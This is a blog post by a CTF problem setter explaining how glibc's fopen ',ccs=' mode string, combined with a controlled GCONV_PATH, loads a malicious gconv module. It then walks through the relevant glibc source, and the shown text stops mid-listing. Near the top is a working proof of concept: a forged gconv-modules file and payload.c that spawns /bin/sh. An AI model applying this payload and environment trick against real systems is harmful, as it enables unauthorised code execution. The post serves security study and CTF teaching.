<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Getting Arbitrary Code Execution from fopen&#39;s 2nd Argument | The Pwnbroker</title>
  <meta name="author" content="Yuki Koike">
  <meta name="description" content="hugeh0ge&#39;s blog">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Getting Arbitrary Code Execution from fopen&#39;s 2nd Argument">
  <meta property="og:site_name" content="The Pwnbroker">
  <meta property="og:image" content="undefined"/>
  
  <link href="/favicon.png" rel="icon">
  <link rel="alternate" href="/atom.xml" title="The Pwnbroker" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
</head>

<body>
<header id="header" class="inner"><div class="alignleft">
    <h1><a href="/">The Pwnbroker</a></h1>
    <h2><a href="/"></a></h2>
  </div>

  <nav id="main-nav">
    <ul>
        <li><a href="/">Home</a></li>
        <li><a href="/archives">Archives</a></li>
        <li><a href="/about">About</a></li>
    </ul>
    <div class="clearfix"></div>
  </nav>
<div class="clearfix"></div>
<div class="alignleft" style="margin-top: 15px"></div>
<div class="clearfix"></div>
</header>


      <div class="outer">
        <section id="main"><article id="post-Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/" class="article-date">
  <time datetime="2019-11-04T12:04:32.000Z" itemprop="datePublished">2019-11-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Getting Arbitrary Code Execution from fopen&#39;s 2nd Argument
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Recently I was in charge of setting problems of CODE BLUE CTF 2019 Finals.<br>One of my problems, Wire Hetimarl was “weird” in the sense that you had to give an eye to the 2nd argument of <code>fopen</code> (that is, a mode like <code>rb</code>) for the perfect solution.<br>How can that argument, which is seemingly and almost always useless for exploitation, be a trigger point?<br>Here, let me show you an example.</p>
<p>First, let’s put the following two files under <code>/home/user</code> :</p>
<figure class="highlight c"><figcaption><span>gconv-modules</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span>  PAYLOAD<span class="comment">//    INTERNAL    ../../../../../../../../home/user/payload    2</span></span><br><span class="line"><span class="keyword">module</span>  <span class="literal">INTERNAL</span>    PAYLOAD<span class="comment">//    ../../../../../../../../home/user/payload    2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><figcaption><span>payload.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"pwned"</span>);</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Compile payload.c with <code>gcc payload.c -o payload.so -shared -fPIC</code>.</p>
<p>Then, put the below code in the same directory</p>
<figure class="highlight c"><figcaption><span>poc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  putenv(<span class="string">"GCONV_PATH=."</span>);</span><br><span class="line">  FILE *fp = fopen(<span class="string">"some_random_file"</span>, <span class="string">"w,ccs=payload"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>and compile and run it. Then…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user:/home/user$ gcc poc.c -o poc</span><br><span class="line">user:/home/user$ ./poc</span><br><span class="line">pwned</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<p>A shell pops out!</p>
<h1 id="What-happened"><a href="#What-happened" class="headerlink" title="What happened?"></a>What happened?</h1><p>As you may notice, <code>GCONV_PATH</code> and <code>,ccs=payload</code> are to blame for this incident.<br>What are they in the first place?<br>I guess most of you never saw them before.</p>
<p>According to the man page, glibc’s <code>fopen</code> has several extended features:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Glibc notes</span><br><span class="line">    The GNU C library allows the following extensions for the string</span><br><span class="line">    specified in mode:</span><br><span class="line"></span><br><span class="line">    c (since glibc 2.3.3)</span><br><span class="line">           Do not make the open operation, or subsequent read and write</span><br><span class="line">           operations, thread cancellation points.  This flag is ignored</span><br><span class="line">           for fdopen().</span><br><span class="line"></span><br><span class="line">    e (since glibc 2.7)</span><br><span class="line">           Open the file with the O_CLOEXEC flag.  See open(2) for more</span><br><span class="line">           information.  This flag is ignored for fdopen().</span><br><span class="line"></span><br><span class="line">    m (since glibc 2.3)</span><br><span class="line">           Attempt to access the file using mmap(2), rather than I/O</span><br><span class="line">           system calls (read(2), write(2)).  Currently, use of mmap(2)</span><br><span class="line">           is attempted only for a file opened for reading.</span><br><span class="line"></span><br><span class="line">    x      Open the file exclusively (like the O_EXCL flag of open(2)).</span><br><span class="line">           If the file already exists, fopen() fails, and sets errno to</span><br><span class="line">           EEXIST.  This flag is ignored for fdopen().</span><br><span class="line"></span><br><span class="line">    In addition to the above characters, fopen() and freopen() support</span><br><span class="line">    the following syntax in mode:</span><br><span class="line"></span><br><span class="line">        ,ccs=string</span><br><span class="line"></span><br><span class="line">    The given string is taken as the name of a coded character set and</span><br><span class="line">    the stream is marked as wide-oriented.  Thereafter, internal</span><br><span class="line">    conversion functions convert I/O to and from the character set</span><br><span class="line">    string.  If the ,ccs=string syntax is not specified, then the wide-</span><br><span class="line">    orientation of the stream is determined by the first file operation.</span><br><span class="line">    If that operation is a wide-character operation, the stream is marked</span><br><span class="line">    wide-oriented, and functions to convert to the coded character set</span><br><span class="line">    are loaded.</span><br></pre></td></tr></table></figure>

<p>Uh-huh? So what I have done with <code>,ccs=payload</code> was just specify the coded character set for the file.<br>But how did it go so far as to pop a shell?<br>This time I’m gonna quote glibc’s source code:</p>
<figure class="highlight c"><figcaption><span>libio/fileops.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_fopen (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode,</span><br><span class="line">        <span class="keyword">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="keyword">int</span> read_write;</span><br><span class="line">  <span class="keyword">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  FILE *result;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *cs;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *last_recognized;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">        is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">      cs = <span class="built_in">strstr</span> (last_recognized + <span class="number">1</span>, <span class="string">",ccs="</span>);</span><br><span class="line">      <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">       to wide.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *endp = __strchrnul (cs + <span class="number">5</span>, <span class="string">','</span>);</span><br><span class="line">    <span class="keyword">char</span> *ccs = <span class="built_in">malloc</span> (endp - (cs + <span class="number">5</span>) + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ccs == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">int</span> malloc_err = errno;  <span class="comment">/* Whatever malloc failed with.  */</span></span><br><span class="line">        (<span class="keyword">void</span>) _IO_file_close_it (fp);</span><br><span class="line">        __set_errno (malloc_err);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">char</span> *) __mempcpy (ccs, cs + <span class="number">5</span>, endp - (cs + <span class="number">5</span>))) = <span class="string">'\0'</span>;</span><br><span class="line">    strip (ccs, ccs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="number">2</span>] == <span class="string">'\0'</span></span><br><span class="line">           ? upstr (ccs, cs + <span class="number">5</span>) : ccs) != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment">     This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment">     for these.  */</span></span><br><span class="line">        (<span class="keyword">void</span>) _IO_file_close_it (fp);</span><br><span class="line">        <span class="built_in">free</span> (ccs);</span><br><span class="line">        __set_errno (EINVAL);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>Seems <code>__wcsmbs_named_conv</code> plays a role. </p>
<figure class="highlight c"><figcaption><span>wcsmbs/wcsmbsload.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get converters for named charset.  */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">__wcsmbs_named_conv (struct gconv_fcts *copy, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span><br><span class="line">&#123;</span><br><span class="line">  copy-&gt;towc = __wcsmbs_getfct (<span class="string">"INTERNAL"</span>, name, &amp;copy-&gt;towc_nsteps);</span><br><span class="line">  <span class="keyword">if</span> (copy-&gt;towc == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  copy-&gt;tomb = __wcsmbs_getfct (name, <span class="string">"INTERNAL"</span>, &amp;copy-&gt;tomb_nsteps);</span><br><span class="line">  <span class="keyword">if</span> (copy-&gt;tomb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __gconv_close_transform (copy-&gt;towc, copy-&gt;towc_nsteps);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attribute_hidden</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *</span></span><br><span class="line"><span class="class">__<span class="title">wcsmbs_getfct</span> (<span class="title">const</span> <span class="title">char</span> *<span class="title">to</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from</span>, <span class="title">size_t</span> *<span class="title">nstepsp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> nsteps;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">result</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__gconv_find_transform (to, from, &amp;result, &amp;nsteps, <span class="number">0</span>) != __GCONV_OK)</span><br><span class="line">    <span class="comment">/* Loading the conversion step is not possible.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Maybe it is someday necessary to allow more than one step.</span></span><br><span class="line"><span class="comment">     Currently this is not the case since the conversions handled here</span></span><br><span class="line"><span class="comment">     are from and to INTERNAL and there always is a converted for</span></span><br><span class="line"><span class="comment">     that.  It the directly following code is enabled the libio</span></span><br><span class="line"><span class="comment">     functions will have to allocate appropriate __gconv_step_data</span></span><br><span class="line"><span class="comment">     elements instead of only one.  */</span></span><br><span class="line">  <span class="keyword">if</span> (nsteps &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We cannot handle this case.  */</span></span><br><span class="line">      __gconv_close_transform (result, nsteps);</span><br><span class="line">      result = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *nstepsp = nsteps;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><figcaption><span>iconv/gconv_db.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__gconv_find_transform (<span class="keyword">const</span> <span class="keyword">char</span> *toset, <span class="keyword">const</span> <span class="keyword">char</span> *fromset,</span><br><span class="line">      struct __gconv_step **handle, <span class="keyword">size_t</span> *nsteps,</span><br><span class="line">      <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *fromset_expand;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *toset_expand;</span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure that the configuration data is read.  */</span></span><br><span class="line">  __gconv_load_conf ();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* See whether the names are aliases.  */</span></span><br><span class="line">  fromset_expand = do_lookup_alias (fromset);</span><br><span class="line">  toset_expand = do_lookup_alias (toset);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  result = find_derivation (toset, toset_expand, fromset, fromset_expand,</span><br><span class="line">          handle, nsteps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Release the lock.  */</span></span><br><span class="line">  __libc_lock_unlock (__gconv_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following code is necessary since `find_derivation' will return</span></span><br><span class="line"><span class="comment">     GCONV_OK even when no derivation was found but the same request</span></span><br><span class="line"><span class="comment">     was processed before.  I.e., negative results will also be cached.  */</span></span><br><span class="line">  <span class="keyword">return</span> (result == __GCONV_OK</span><br><span class="line">    ? (*handle == <span class="literal">NULL</span> ? __GCONV_NOCONV : __GCONV_OK)</span><br><span class="line">    : result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The main function: find a possible derivation from the `fromset' (either</span></span><br><span class="line"><span class="comment">   the given name or the alias) to the `toset' (again with alias).  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">find_derivation (<span class="keyword">const</span> <span class="keyword">char</span> *toset, <span class="keyword">const</span> <span class="keyword">char</span> *toset_expand,</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *fromset, <span class="keyword">const</span> <span class="keyword">char</span> *fromset_expand,</span><br><span class="line">     struct __gconv_step **handle, <span class="keyword">size_t</span> *nsteps)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">derivation_step</span> *<span class="title">first</span>, *<span class="title">current</span>, **<span class="title">lastp</span>, *<span class="title">solution</span> = <span class="title">NULL</span>;</span></span><br><span class="line">  <span class="keyword">int</span> best_cost_hi = INT_MAX;</span><br><span class="line">  <span class="keyword">int</span> best_cost_lo = INT_MAX;</span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The task is to find a sequence of transformations, backed by the</span></span><br><span class="line"><span class="comment">     existing modules - whether builtin or dynamically loadable -,</span></span><br><span class="line"><span class="comment">     starting at `fromset' (or `fromset_expand') and ending at `toset'</span></span><br><span class="line"><span class="comment">     (or `toset_expand'), and with minimal cost.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     For computer scientists, this is a shortest path search in the</span></span><br><span class="line"><span class="comment">     graph where the nodes are all possible charsets and the edges are</span></span><br><span class="line"><span class="comment">     the transformations listed in __gconv_modules_db.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     For now we use a simple algorithm with quadratic runtime behaviour.</span></span><br><span class="line"><span class="comment">     A breadth-first search, starting at `fromset' and `fromset_expand'.</span></span><br><span class="line"><span class="comment">     The list starting at `first' contains all nodes that have been</span></span><br><span class="line"><span class="comment">     visited up to now, in the order in which they have been visited --</span></span><br><span class="line"><span class="comment">     excluding the goal nodes `toset' and `toset_expand' which get</span></span><br><span class="line"><span class="comment">     managed in the list starting at `solution'.</span></span><br><span class="line"><span class="comment">     `current' walks through the list starting at `first' and looks</span></span><br><span class="line"><span class="comment">     which nodes are reachable from the current node, adding them to</span></span><br><span class="line"><span class="comment">     the end of the list [`first' or `solution' respectively] (if</span></span><br><span class="line"><span class="comment">     they are visited the first time) or updating them in place (if</span></span><br><span class="line"><span class="comment">     they have have already been visited).</span></span><br><span class="line"><span class="comment">     In each node of either list, cost_lo and cost_hi contain the</span></span><br><span class="line"><span class="comment">     minimum cost over any paths found up to now, starting at `fromset'</span></span><br><span class="line"><span class="comment">     or `fromset_expand', ending at that node.  best_cost_lo and</span></span><br><span class="line"><span class="comment">     best_cost_hi represent the minimum over the elements of the</span></span><br><span class="line"><span class="comment">     `solution' list.  */</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Did you grasp the situation? So, when we give a coded character set, glibc manages to provide the way of translation between the given set and the internally used set (sometimes it attempts a breadth-first search actually! pretty interesting).</p>
<p>In a nutshell, <code>GCONV_PATH</code> is an environment variable for changing the configuration of this translation mechanism:</p>
<figure class="highlight c"><figcaption><span>iconv/gconv_conf.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__gconv_read_conf (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *modules = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">size_t</span> nmodules = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> save_errno = errno;</span><br><span class="line">  <span class="keyword">size_t</span> cnt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First see whether we should use the cache.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__gconv_load_cache () == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Yes, we are done.  */</span></span><br><span class="line">      __set_errno (save_errno);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><figcaption><span>iconv/gconv_cache.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__gconv_load_cache (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">gconvcache_header</span> *<span class="title">header</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We cannot use the cache if the GCONV_PATH environment variable is</span></span><br><span class="line"><span class="comment">     set.  */</span></span><br><span class="line">  __gconv_path_envvar = getenv (<span class="string">"GCONV_PATH"</span>);</span><br><span class="line">  <span class="keyword">if</span> (__gconv_path_envvar != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>That means, if we can set <code>GCONV_PATH</code> as an arbitrary value, then we can forge an arbitrary path of converting coded character sets.<br>But how does this matter? To answer this, we need to look into <code>find_derivation</code> deeper.</p>
<figure class="highlight c"><figcaption><span>iconv/gconv_db.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The main function: find a possible derivation from the `fromset' (either</span></span><br><span class="line"><span class="comment">   the given name or the alias) to the `toset' (again with alias).  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">find_derivation (<span class="keyword">const</span> <span class="keyword">char</span> *toset, <span class="keyword">const</span> <span class="keyword">char</span> *toset_expand,</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *fromset, <span class="keyword">const</span> <span class="keyword">char</span> *fromset_expand,</span><br><span class="line">     struct __gconv_step **handle, <span class="keyword">size_t</span> *nsteps)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (solution != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We really found a way to do the transformation.  */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Choose the best solution.  This is easy because we know that</span></span><br><span class="line"><span class="comment">   the solution list has at most length 2 (one for every possible</span></span><br><span class="line"><span class="comment">   goal node).  */</span></span><br><span class="line">      <span class="keyword">if</span> (solution-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span 